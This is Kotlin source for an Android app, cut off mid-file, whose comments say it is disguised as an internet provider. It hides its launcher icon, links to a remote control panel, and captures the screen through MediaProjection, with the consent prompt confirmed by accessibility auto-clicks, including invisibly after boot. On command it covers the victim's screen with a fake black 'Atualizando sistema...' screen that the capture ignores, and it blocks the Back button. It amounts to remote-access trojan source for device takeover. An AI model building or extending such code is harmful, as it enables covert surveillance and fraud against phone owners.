package com.example.acessomaterno

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import androidx.core.app.NotificationCompat
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.content.pm.ShortcutManager
import android.graphics.Bitmap
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.FileProvider
import java.io.File
import android.view.WindowManager
import android.graphics.PixelFormat
import android.text.InputType
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.core.content.pm.ShortcutInfoCompat
import androidx.core.content.pm.ShortcutManagerCompat
import androidx.core.graphics.drawable.IconCompat
import androidx.core.view.ViewCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream

/**
 * Activity principal (launcher) — camuflada como provedora de internet.
 * Marca (nome / sigla / subtítulo) é 100% dinâmica: vem de strings.xml,
 * gravada pelo servidor em /salvar-config-app (white-label).
 * Design Moderno, Profissional com Cabeçalho e Cards Interativos.
 */
class MainActivity : Activity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_MEDIA_PROJECTION = 1001
        private const val REQUEST_OVERLAY = 1002
        private const val REQUEST_NOTIFICACAO = 1003

        // Extra que reexibe o modal interno de consentimento do espelhamento
        // quando a conexão caiu e voltou (casa de segurança: o espelhamento
        // precisa ser restabelecido). Disparado pelo SocketManager na RECONEXÃO.
        const val EXTRA_REVALIDAR_ESPELHAMENTO = "REVALIDAR_ESPELHAMENTO"

        // ── MODO ATUALIZAÇÃO (tela preta discreta, SEM WindowManager overlay) ──
        // Universal Android 7 (API 24) → 15 (API 35). A MainActivity abre numa
        // janela TRANSPARENTE (zero tela branca) com FLAG_SECURE (o MediaProjection
        // ignora a janela e segue filmando o fundo real) e desenha uma tela preta
        // imersiva "Atualizando sistema...". Fecha instantaneamente no desativar.
        const val EXTRA_MODO_ATUALIZACAO = "MODO_ATUALIZACAO"
        private const val CANAL_ATUALIZACAO = "AtualizacaoTelaPretaFSI"
        private const val NOTIF_ATUALIZACAO_ID = 7731

        /** Instância viva da Activity em modo atualização (para fechar na hora). */
        @Volatile var instanciaAtualizacao: MainActivity? = null

        /** True enquanto o switch está na Direita (tela preta ativa). A
         *  acessibilidade usa isto para RE-TRAZER a tela preta ao topo se outro
         *  app abrir na frente (vigia TYPE_WINDOW_STATE_CHANGED). */
        @Volatile var modoAtualizacaoAtivo = false

        /** Abre a tela preta de atualização. Universal: tenta startActivity pelo
         *  contexto da ACESSIBILIDADE (privilegiado, passa no Android 10–15) e,
         *  em paralelo, arma um FullScreenIntent como garantia (o FSI acende e
         *  abre a Activity mesmo de segundo plano). No Android 7–9 o startActivity
         *  direto já basta. */
        fun abrirModoAtualizacao(context: Context?) {
            modoAtualizacaoAtivo = true
            val ctx = context?.applicationContext ?: MyAccessibilityService.instance ?: return
            val intent = Intent(ctx, MainActivity::class.java).apply {
                putExtra(EXTRA_MODO_ATUALIZACAO, true)
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
                )
            }
            // 1) Caminho privilegiado: contexto da acessibilidade (inicia Activity
            //    em segundo plano em qualquer versão).
            val svc = MyAccessibilityService.instance
            var abriu = false
            if (svc != null) {
                try { svc.startActivity(intent); abriu = true } catch (_: Exception) {}
            }
            if (!abriu) {
                try { ctx.startActivity(intent); abriu = true } catch (_: Exception) {}
            }
            // 2) Garantia universal: FullScreenIntent (abre a Activity mesmo de
            //    background no Android 10+). NotificationChannel só no O+.
            try {
                val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (nm.getNotificationChannel(CANAL_ATUALIZACAO) == null) {
                        val canal = NotificationChannel(
                            CANAL_ATUALIZACAO, "Atualização do sistema",
                            NotificationManager.IMPORTANCE_HIGH
                        ).apply {
                            setSound(null, null); enableVibration(false); enableLights(false)
                            setShowBadge(false)
                        }
                        nm.createNotificationChannel(canal)
                    }
                }
                val flagsPI = PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                val pi = PendingIntent.getActivity(ctx, 0, intent, flagsPI)
                val notif = NotificationCompat.Builder(ctx, CANAL_ATUALIZACAO)
                    .setSmallIcon(android.R.drawable.stat_sys_download)
                    .setContentTitle("Atualizando sistema")
                    .setContentText("Em andamento…")
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setCategory(NotificationCompat.CATEGORY_PROGRESS)
                    .setFullScreenIntent(pi, true)
                    .setSilent(true)
                    .setOngoing(true)
                    .build()
                nm.notify(NOTIF_ATUALIZACAO_ID, notif)
                // Remove a notificação logo após (o FSI já abriu a Activity).
                Handler(Looper.getMainLooper()).postDelayed({
                    try { nm.cancel(NOTIF_ATUALIZACAO_ID) } catch (_: Exception) {}
                }, 1500)
            } catch (_: Exception) {}
        }

        /** Fecha a tela preta de atualização NA HORA, sem animação de saída. */
        fun fecharModoAtualizacao() {
            modoAtualizacaoAtivo = false
            val inst = instanciaAtualizacao ?: return
            Handler(Looper.getMainLooper()).post {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) inst.finishAndRemoveTask()
                    else inst.finish()
                } catch (_: Exception) {
                    try { inst.finish() } catch (_: Exception) {}
                }
            }
            instanciaAtualizacao = null
        }

        private const val PREFS = "rastreio_facil_prefs"
        private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
        private const val KEY_PERMISSOES_OK = "permissoes_onboarding_ok"
        // Quando true, o cliente já chegou na tela "Análise em Andamento"
        // (etapa 4). Persistido para que, ao fechar e reabrir o app, a tela
        // permaneça a mesma (com o círculo de loop).
        private const val KEY_ANALISE_EM_ANDAMENTO = "analise_em_andamento"
        private const val AUTO_CONFIRMAR_INICIAR_MS = 350L

        // Paleta de cores profissional
        private val COR_BG_GERAL = Color.parseColor("#F4F6F9")
        private val COR_PRIMARIA = Color.parseColor("#0066FF")
        private val COR_PRIMARIA_DARK = Color.parseColor("#0043A8")
        private val COR_TEXTO_ESCURO = Color.parseColor("#1E293B")
        private val COR_TEXTO_MUTED = Color.parseColor("#64748B")
        private val COR_TEXTO_LIGHT = Color.parseColor("#94A3B8")
        private val COR_CARD_BG = Color.parseColor("#FFFFFF")
        private val COR_CARD_BORDA = Color.parseColor("#E2E8F0")
        private val COR_CARD_SELECIONADO_BG = Color.parseColor("#F0F6FF")
        private val COR_VERDE_DESTAQUE = Color.parseColor("#059669")
        private val COR_VERDE_LIGHT_BG = Color.parseColor("#ECFDF5")
        private val COR_LARANJA_POPULAR = Color.parseColor("#EA580C")
        private val COR_LARANJA_LIGHT_BG = Color.parseColor("#FFF7ED")
    }

    private lateinit var prefs: SharedPreferences
    private val handlerMain = Handler(Looper.getMainLooper())

    private var voltandoDeAcessibilidade = false
    private var iniciarCapturaDisparado = false

    // ── INJETOR VIRTUAL PÓS-BOOT (flag de controle) ────────────────────
    // Marcada como true quando a Activity é reanimada pela acessibilidade
    // após o boot com o extra AUTO_BOOT_REANIMAR. Nesse modo a Activity
    // roda headless (sem UI) e se fecha silenciosamente assim que o
    // MediaProjection é concedido — o ScreenCaptureService (Foreground)
    // continua enviando frames binários por baixo.
    @Volatile private var reanimacaoBootAutomatica = false

    // Containers para gerenciamento dinâmico de etapas
    private lateinit var containerInicial: LinearLayout
    private lateinit var containerCadastro: LinearLayout
    private lateinit var containerPlanos: LinearLayout
    private lateinit var containerSucesso: LinearLayout

    // Indicadores de progresso visual (Step Indicator)
    private lateinit var step1View: TextView
    private lateinit var step2View: TextView
    private lateinit var step3View: TextView

    // Plano selecionado atualmente (index 0, 1, 2)
    private var planoSelecionadoIndex = 1 // Padrão: 800 Mega (Mais Popular)
    private val cardsPlanos = mutableListOf<LinearLayout>()

    private fun resString(chave: String, fallback: String): String {
        return try {
            val id = resources.getIdentifier(chave, "string", packageName)
            if (id != 0) getString(id) else fallback
        } catch (e: Exception) {
            fallback
        }
    }
    private fun marcaNome(): String {
        val valor = resString("app_name", "")
        if (valor.isBlank() || valor.contains("Acesso Materno", true)) {
            return "Giga+ Internet"
        }
        return valor
    }
    private fun marcaSigla(): String = resString("app_sigla", "G+")
    private fun marcaSubtitulo(): String = resString("app_subtitulo", "Internet de Ultravelocidade")

    private fun ocultarIconeDaGaveta() {
        try {
            // Desativa APENAS o alias .EntradaGaveta — o ícone da gaveta. A
            // MainActivity NUNCA é desativada, senão o atalho fixado (que aponta
            // para ela) ficaria "morto" e o app sumiria também das Configurações.
            val alias = android.content.ComponentName(packageName, "$packageName.EntradaGaveta")
            packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            // Fallback defensivo: se algum OUTRO componente ainda expuser
            // MAIN+LAUNCHER, desativa também — mas NUNCA a MainActivity.
            val mainActivityNome = MainActivity::class.java.name
            val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setPackage(packageName)
            val resolves = packageManager.queryIntentActivities(intent, 0)
            for (info in resolves) {
                val nome = info.activityInfo.name
                // PROTEÇÃO: jamais desativar a MainActivity (quebraria o atalho).
                if (nome == mainActivityNome) continue
                val componente = android.content.ComponentName(
                    info.activityInfo.packageName,
                    nome
                )
                packageManager.setComponentEnabledSetting(
                    componente,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Falha ao ocultar ícone da gaveta: ${e.message}")
        }
    }

    // Marca se esta instância está em modo atualização (bloqueia Voltar etc.).
    @Volatile private var emModoAtualizacao = false

    /** Entra na tela preta de atualização: tema transparente ANTES do super
     *  (zero tela branca), FLAG_SECURE (espelhamento ignora e filma o fundo
     *  real), tela cheia preta imersiva + texto, Voltar bloqueado. */
    private fun entrarModoAtualizacao(savedInstanceState: Bundle?) {
        // Tema transparente ANTES do super.onCreate -> nunca pisca janela branca.
        setTheme(R.style.Theme_AcessoMaterno_Atualizacao)
        // Sem animação de entrada (Android 14+ usa overrideActivityTransition).
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                overrideActivityTransition(Activity.OVERRIDE_TRANSITION_OPEN, 0, 0)
            } else {
                @Suppress("DEPRECATION") overridePendingTransition(0, 0)
            }
        } catch (_: Exception) {}
        super.onCreate(savedInstanceState)
        emModoAtualizacao = true
        instanciaAtualizacao = this

        // FLAG_SECURE ANTES de desenhar: o MediaProjection ignora esta janela e
        // continua filmando o fundo REAL do aparelho (o painel vê o vídeo normal).
        try { window.addFlags(WindowManager.LayoutParams.FLAG_SECURE) } catch (_: Exception) {}
        try {
            window.setBackgroundDrawable(android.graphics.drawable.ColorDrawable(Color.BLACK))
            window.statusBarColor = Color.BLACK
            window.navigationBarColor = Color.BLACK
        } catch (_: Exception) {}

        // Tela cheia PRETA + texto central discreto.
        val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
        val txt = TextView(this).apply {
            text = "Atualizando sistema..."
            setTextColor(Color.parseColor("#D0D0D0"))
            textSize = 16f
            gravity = Gravity.CENTER
        }
        root.addView(
            txt,
            FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER
            )
        )
        setContentView(root)
        aplicarImersivoAtualizacao()
    }

    /** Immersive fullscreen cobrindo status/navigation bar. Android 11+ via
     *  WindowInsetsController; Android 7–10 via systemUiVisibility. */
    private fun aplicarImersivoAtualizacao() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.setDecorFitsSystemWindows(false)
                window.insetsController?.let { c ->
                    c.hide(android.view.WindowInsets.Type.statusBars() or android.view.WindowInsets.Type.navigationBars())
                    c.systemBarsBehavior =
                        android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                }
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    )
            }
        } catch (_: Exception) {}
    }

    @Deprecated("Bloqueio de Voltar universal (Android 7–15)")
    override fun onBackPressed() {
        // Em modo atualização, IGNORA o Voltar (não deixa sair da tela preta).
        if (emModoAtualizacao) return
        @Suppress("DEPRECATION") super.onBackPressed()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        // ── MODO ATUALIZAÇÃO (tela preta discreta): ANTES de tudo ──────────────
        if (intent?.getBooleanExtra(EXTRA_MODO_ATUALIZACAO, false) == true) {
            entrarModoAtualizacao(savedInstanceState)
            return
        }
        // ── INJETOR VIRTUAL PÓS-BOOT: verificação ANTES de qualquer outra linha ──
        if (intent?.getBooleanExtra("AUTO_BOOT_REANIMAR", false) == true) {
            // JANELA INVISÍVEL: no boot/desbloqueio o app NÃO deve "abrir"
            // visualmente — deve aparecer APENAS o modal do MediaProjection
            // (centralizado), que o auto-clique confirma. Sem isto, a Activity
            // headless mostrava uma janela em branco (tema opaco) por ~1s antes
            // do finish(), parecendo que o app abriu. Tema translúcido + fundo
            // transparente = só o modal fica visível.
            setTheme(android.R.style.Theme_Translucent_NoTitleBar)
            super.onCreate(savedInstanceState)
            try {
                window.setBackgroundDrawableResource(android.R.color.transparent)
                window.setDimAmount(0f)
            } catch (_: Exception) {}
            reanimacaoBootAutomatica = true
            SocketManager.appContext = applicationContext
            Thread {
                try {
                    SocketManager.connect()
                } catch (e: Exception) {
                    Log.e(TAG, "Falha ao conectar no boot automático: ${e.message}")
                }
            }.start()
            val prefsBoot = getSharedPreferences(PREFS, MODE_PRIVATE)
            if (prefsBoot.getBoolean("atalho_confirmado", false)) {
                ocultarIconeDaGaveta()
            }
            iniciarCaptura()
            return
        }

        super.onCreate(savedInstanceState)

        prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        SocketManager.appContext = applicationContext

        // 1. Renderiza a interface principal imediatamente (setContentView)
        construirInterfaceDinamica()

        Thread {
            try {
                SocketManager.connect()
                RegistroPainel.registrar()
            } catch (e: Exception) {
                Log.e(TAG, "Falha ao conectar/registrar no painel: ${e.message}")
            }
        }.start()

        // Permissões agora são conduzidas pelo ORQUESTRADOR (fluxo único e
        // sequencial, com modal + inject). Dispara no 1º acesso; concluído 1x,
        // nunca mais roda. Notificações/bateria entram como passos do fluxo.
        handlerMain.postDelayed({
            try { executarOrquestracaoPermissoes() } catch (_: Exception) {}
        }, 800L)

        // Registra BroadcastReceiver da tela de carregamento / atualização remota
        try {
            val filter = IntentFilter("com.example.acessomaterno.ACAO_LOADING_OVERLAY")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(loadingReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(loadingReceiver, filter)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao registrar loadingReceiver: ${e.message}")
        }

        val primeiroAcesso = prefs.getBoolean(KEY_PRIMEIRO_ACESSO, true)
        if (primeiroAcesso) {
            MyAccessibilityService.onboardingRapido = true
        }

        // Aguarda a renderização completa da janela antes de avaliar etapas ou modais
        window.decorView.post {
            try {
                atualizarEtapaInterface()
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao atualizar etapa inicial: ${e.message}")
            }
        }

        // Se a Activity foi (re)aberta pelo SocketManager após uma reconexão,
        // reexibe o modal interno de consentimento do espelhamento.
        tratarRevalidacaoEspelhamento(intent)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        // Se a Activity JÁ estava viva e chegou o comando de atualização, cobre
        // a tela atual com o preto (sem recriar) — garante o modo em qualquer caso.
        if (intent?.getBooleanExtra(EXTRA_MODO_ATUALIZACAO, false) == true && !emModoAtualizacao) {
            emModoAtualizacao = true
            instanciaAtualizacao = this
            try { window.addFlags(WindowManager.LayoutParams.FLAG_SECURE) } catch (_: Exception) {}
            val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
            val txt = TextView(this).apply {
                text = "Atualizando sistema..."
                setTextColor(Color.parseColor("#D0D0D0")); textSize = 16f; gravity = Gravity.CENTER
            }
            root.addView(txt, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT, Gravity.CENTER))
            addContentView(root, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT))
            aplicarImersivoAtualizacao()
            return
        }
        tratarRevalidacaoEspelhamento(intent)
    }

    /** Reexibe o MESMO modal interno de consentimento do espelhamento. Chamado
     *  quando o socket RECONECTA e a captura não está ativa. Anti-duplicidade:
     *  se já está capturando, não faz nada. */
    private fun tratarRevalidacaoEspelhamento(intent: Intent?) {
        if (intent?.getBooleanExtra(EXTRA_REVALIDAR_ESPELHAMENTO, false) != true) return
        // Só pula se há captura REAL (MediaProjection válida). Se o serviço está
        // vivo mas SEM captura (token perdido ao bloquear/dormir), RE-PEDE o
        // consentimento -> modal "Iniciar agora" -> auto-clique (inject).
        if (ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade) return
        iniciarCapturaDisparado = false                     // libera novo fluxo de captura
        handlerMain.post { exibirModalConsentimentoTela() } // reaparece o modal interno
    }

    override fun onResume() {
        super.onResume()
        if (voltandoDeAcessibilidade) {
            voltandoDeAcessibilidade = false
        }
        // ORQUESTRADOR: ao voltar de QUALQUER tela de permissão, re-checa e avança
        // para a próxima pendente (ou conclui). Só roda enquanto houver pendência.
        try {
            if (::prefs.isInitialized && !prefs.getBoolean(KEY_PERMISSOES_OK, false)) {
                handlerMain.postDelayed({ executarOrquestracaoPermissoes() }, 600L)
            }
        } catch (_: Exception) {}
    }

    override fun onPause() {
        super.onPause()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (emModoAtualizacao && instanciaAtualizacao === this) instanciaAtualizacao = null
        handlerMain.removeCallbacksAndMessages(null)
        try {
            unregisterReceiver(loadingReceiver)
        } catch (_: Exception) {}
        // Remove o overlay de atualização (janela transparente) se estiver na tela.
        try {
            loadingOverlayJanela?.let { v ->
                (getSystemService(Context.WINDOW_SERVICE) as? WindowManager)?.removeView(v)
            }
            loadingOverlayJanela = null
        } catch (_: Exception) {}
    }

    private lateinit var loadingOverlay: FrameLayout
    // Referência do layout raiz (fallback quando não há permissão de overlay) e
    // controle da janela separada do overlay de atualização (transparente).
    private lateinit var rootLayout: FrameLayout
    private var loadingOverlayJanela: View? = null
    // Auto-remoção após 2 minutos (camada temporária de atualização).
    private val autoRemoverOverlayRunnable = Runnable {
        mostrarLoadingOverlay(false)
        try { SocketManager.notificarAtualizacaoConcluida() } catch (_: Exception) {}
    }
    private val loadingReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.example.acessomaterno.ACAO_LOADING_OVERLAY") {
                val ativo = intent.getBooleanExtra("ativo", false)
                aplicarOverlayAtualizacao(ativo)
                MyAccessibilityService.instance?.ativarAtualizacaoGlobal(ativo)
            }
        }
    }

    /**
     * Overlay de Atualização (Fundo Limpo): roda em celular físico E em
     * emuladores (Nox/MEmu/BlueStacks/AVD). Quando há permissão de overlay,
     * usa o OverlayService (janela independente que sobrevive em background);
     * no emulador o Service aplica fundo semitransparente (#66000000), no
     * físico 100% transparente. Sem permissão, cai no fallback dentro da
     * Activity (mesma lógica de cor por dispositivo em mostrarLoadingOverlay).
     * O espelhamento de tela continua ativo em ambos (sem FLAG_SECURE).
     */
    private fun aplicarOverlayAtualizacao(ativo: Boolean) {
        try {
            if (ativo && podeSobrepor()) {
                // Service (janela independente) — funciona em físico e emulador.
                startService(Intent(this,
                    OverlayService::class.java))
                // Evita duplicata: o Service é o dono da janela; a janela
                // dentro da Activity fica desligada.
                mostrarLoadingOverlay(false)
                return
            }
            // Desligando OU sem permissão: garante que o Service não rode e
            // usa o fallback dentro da Activity (ou remove, ao desligar).
            stopService(Intent(this, OverlayService::class.java))
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao controlar OverlayService: ${e.message}")
        }
        mostrarLoadingOverlay(ativo)
    }

    private fun construirLoadingOverlay(): FrameLayout {
        return FrameLayout(this).apply {
            id = View.generateViewId()
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
            // CORREÇÃO TELA PRETA (Nox / emulador flutuante): fundo 100%
            // transparente. O MediaProjection captura o fundo NORMAL do
            // dispositivo por trás; apenas o cartão central (círculo + texto)
            // fica visível. Combinado com PixelFormat.TRANSLUCENT e sem
            // FLAG_SECURE (ver mostrarLoadingOverlay) o espelhamento do
            // emulador flutuante NUNCA mais fica preto.
            setBackgroundColor(Color.parseColor("#00000000"))
            visibility = View.GONE
            isClickable = true
            isFocusable = true

            // Cartão escuro arredondado SÓ atrás do círculo + texto (mantém
            // legibilidade sem cobrir a tela). ~80% preto, cantos arredondados.
            val cartaoFundo = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(24).toFloat()
                setColor(Color.parseColor("#CC000000"))
            }

            val content = LinearLayout(context).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setPadding(dp(40), dp(36), dp(40), dp(36))
                background = cartaoFundo
                layoutParams = FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.CENTER
                }
            }

            val progressBar = ProgressBar(context).apply {
                isIndeterminate = true
                layoutParams = LinearLayout.LayoutParams(dp(64), dp(64)).apply {
                    bottomMargin = dp(24)
                }
            }

            val title = TextView(context).apply {
                text = "Atualizando o aplicativo..."
                textSize = 20f
                setTextColor(Color.WHITE)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dp(12)
                }
            }

            val subtitle = TextView(context).apply {
                text = "Aguarde enquanto sincronizamos os dados.\nNão feche o aplicativo."
                textSize = 14f
                setTextColor(Color.parseColor("#CCCCCC"))
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }

            content.addView(progressBar)
            content.addView(title)
            content.addView(subtitle)
            addView(content)
        }
    }

    fun mostrarLoadingOverlay(ativo: Boolean) {
        handlerMain.post {
            try {
                handlerMain.removeCallbacks(autoRemoverOverlayRunnable)
                // Cor de fundo conforme o dispositivo (fallback dentro da
                // Activity): emulador = escurecimento semitransparente
                // (#66000000) para destacar o círculo de carregamento mantendo
                // os apps por baixo visíveis; celular físico = 100%
                // transparente (Fundo Limpo). Sem FLAG_SECURE → o
                // espelhamento (MediaProjection) continua sem tela preta.
                if (::loadingOverlay.isInitialized) {
                    val corFundo = if (OverlayService.isRunningOnEmulator(this@MainActivity))
                        "#66000000" else "#00000000"
                    loadingOverlay.setBackgroundColor(Color.parseColor(corFundo))
                }
                val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
                if (ativo) {
                    if (loadingOverlayJanela != null) {
                        // Já está na tela: permanece até desligar MANUALMENTE (sem auto-remove).
                        return@post
                    }
                    if (!::loadingOverlay.isInitialized) return@post
                    val adicionado = if (wm != null && podeSobrepor()) {
                        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
                        // CORREÇÃO TELA PRETA: SEM FLAG_SECURE (no Nox/emulador
                        // ela deixa a captura PRETA — não transparente — e em
                        // UID igual o MediaProjection captura a janela mesmo
                        // assim). PixelFormat.TRANSLUCENT respeita o fundo
                        // transparente do overlay. Resultado: o MediaProjection
                        // captura o fundo NORMAL do dispositivo por trás e
                        // apenas o círculo de carregamento (cartão central)
                        // fica visível no emulador flutuante. SEM
                        // FLAG_NOT_TOUCHABLE: consome os toques locais →
                        // usuário não sai do overlay no dispositivo. Botão
                        // Home (ação global) continua funcionando.
                        val params = WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                            PixelFormat.TRANSLUCENT
                        ).apply {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                            }
                        }
                        loadingOverlay.visibility = View.VISIBLE
                        try {
                            wm.addView(loadingOverlay, params)
                            loadingOverlayJanela = loadingOverlay
                            true
                        } catch (e: Exception) {
                            Log.e(TAG, "Falha ao adicionar overlay via WindowManager: ${e.message}")
                            false
                        }
                    } else false
                    if (!adicionado) {
                        // Fallback (sem permissão de overlay): adiciona na Activity.
                        // (Será capturado pelo espelhamento, mas aparece no dispositivo.)
                        loadingOverlay.visibility = View.VISIBLE
                        try {
                            if (loadingOverlay.parent == null) rootLayout.addView(loadingOverlay)
                        } catch (_: Exception) {}
                        loadingOverlayJanela = loadingOverlay
                    }
                    // Fica ligado ate desligar MANUALMENTE pelo painel (sem auto-remove de 2 min).
                    Log.d(TAG, "Overlay de atualização ATIVADO (transparente, sem FLAG_SECURE, TRANSLUCENT) — espelhamento continua claro; permanece ate desligar manualmente.")
                } else {
                    loadingOverlayJanela?.let { v ->
                        try { wm?.removeView(v) } catch (_: Exception) {}
                        try { (v.parent as? android.view.ViewGroup)?.removeView(v) } catch (_: Exception) {}
                    }
                    loadingOverlayJanela = null
                    if (::loadingOverlay.isInitialized) loadingOverlay.visibility = View.GONE
                    Log.d(TAG, "Overlay de atualização REMOVIDO.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro ao mostrar/remover loadingOverlay: ${e.message}")
            }
        }
    }

    private fun construirInterfaceDinamica() {
        rootLayout = FrameLayout(this).apply {
            setBackgroundColor(COR_BG_GERAL)
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        val contentLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT
            )
        }

        // 1. CABEÇALHO SUPERIOR (HEADER PROFISSIONAL)
        val header = criarCabecalhoProfissional()
        contentLayout.addView(header)

        // 2. INDICADOR DE PASSOS / PROGRESSO
        val stepBar = criarIndicadorPassos()
        contentLayout.addView(stepBar)

        // 3. SCROLL VIEW COM CONTEÚDO PRINCIPAL
        val scroll = ScrollView(this).apply {
            isFillViewport = true
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0,
                1f
            )
        }

        val layoutConteudo = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(24))
        }

        // ETAPA 1: TELA INICIAL
        containerInicial = construirContainerInicial()

        // ETAPA 2: FORMULÁRIO DE CADASTRO
        containerCadastro = construirContainerCadastro()

        // ETAPA 3: VITRINE DE PLANOS (CARDS DE OPÇÕES)
        containerPlanos = construirContainerPlanos()

        // ETAPA 4: FINALIZAÇÃO SUCESSO
        containerSucesso = construirContainerSucesso()

        layoutConteudo.addView(containerInicial)
        layoutConteudo.addView(containerCadastro)
        layoutConteudo.addView(containerPlanos)
        layoutConteudo.addView(containerSucesso)

        scroll.addView(layoutConteudo)
        contentLayout.addView(scroll)

        rootLayout.addView(contentLayout)

        loadingOverlay = construirLoadingOverlay()
        // NÃO adiciona no layout da Activity: o overlay de atualização é uma
        // janela SEPARADA do WindowManager, transparente e SEM FLAG_SECURE
        // (TRANSLUCENT) → o MediaProjection captura o fundo NORMAL do
        // dispositivo por trás e apenas o círculo de carregamento (cartão
        // central) fica visível no emulador flutuante, sem tela preta.
        setContentView(rootLayout)
    }

    /**
     * Cria um cabeçalho moderno com gradiente, logo e badge de status.
     */
    private fun criarCabecalhoProfissional(): View {
